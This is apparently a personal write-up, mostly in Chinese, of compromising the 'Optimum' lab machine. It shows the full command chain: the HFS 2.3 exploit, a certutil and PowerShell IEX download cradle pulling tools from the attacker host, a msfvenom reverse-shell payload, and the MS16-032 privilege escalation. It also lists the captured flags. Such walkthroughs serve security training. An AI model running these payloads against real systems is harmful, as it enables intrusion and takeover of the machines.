# Optimum

- victim
  - 10.10.10.8
- local
  - 10.10.14.19

---

## 扫描结果分析

轻度扫描就一个80

## Web分析

HFS系统——`HttpFileServer 2.3`

EDB搜索

```
HFS Http File Server
```

选用https://www.exploit-db.com/exploits/39161

```bash
proxychains4 wget https://www.exploit-db.com/raw/39161 -O exp.py
cp /usr/bin/nc ./
python3 -m http.server 80
# 适配exp.py将ip和端口调整好
# local: sudo nc -lvvp 443
python exp.py 10.10.10.8 80
```

成功获得shell

user.txt

```
d0c39409d7b994a9a1389ebf38ef5f73
```

## Privilege Escalation

```shell
whoami /priv

SeChangeNotifyPrivilege       Bypass traverse checking       Enabled

systeminfo

Microsoft Windows Server 2012 R2 Standard
x64-based PC
```
x64架构不用自己编译，直接拉
```bash
proxychains4 wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```
t.bat
```shell
whoami > C:\Users\kostas\Desktop\t.txt
user Administrator 123456
```
```shell
certutil -f -urlcache http://10.10.14.19/JuicyPotato.exe JuicyPotato.exe
certutil -f -urlcache http://10.10.14.19/t.bat t.bat

JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/k C:\Users\kostas\Desktop\t.bat" -l 1337
```

居然不行，PowerUp.ps1再查查

```bash
proxychains4 wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1
echo Invoke-AllChecks >> PowerUp.ps1
```

```powershell
#victim
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.19/PowerUp.ps1')
```

没有检测到

### Meterpreter 枚举

因为windows suggest在x64架构下不稳定，所以换meterpreter进行枚举

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.19 LPORT=5555 -f exe > myshell.exe
```

```shell
certutil -f -urlcache http://10.10.14.19/myshell.exe myshell.exe
```

从32位migrate到64位如explorer上，稳一点，利于提权

```shell
search exploit/windows/local -o a.txt
cat a.txt |grep privesc
```

得到如下6个结果

```
"5","exploit/windows/local/appxsvc_hard_link_privesc","2019-04-09","normal","Yes","AppXSvc Hard Link Privilege Escalation"
"31","exploit/windows/local/gog_galaxyclientservice_privesc","2020-04-28","excellent","Yes","GOG GalaxyClientService Privilege Escalation"
"52","exploit/windows/local/ms16_032_secondary_logon_handle_privesc","2016-03-21","normal","Yes","MS16-032 Secondary Logon Handle Privilege Escalation"
"55","exploit/windows/local/ms18_8120_win32k_privesc","2018-05-09","good","No","Windows SetImeInfoEx Win32k NULL Pointer Dereference"
"67","exploit/windows/local/plantronics_hub_spokesupdateservice_privesc","2019-08-30","excellent","Yes","Plantronics Hub SpokesUpdateService Privilege Escalation"
"76","exploit/windows/local/ricoh_driver_privesc","2020-01-22","normal","Yes","Ricoh Driver Privilege Escalation"
```

枚举后（记得设置架构）发现`exploit/windows/local/ms16_032_secondary_logon_handle_privesc`可用

使用后得到SYSTEM

```
51ed1b36553c8461f4552c2e92b3eeed
```

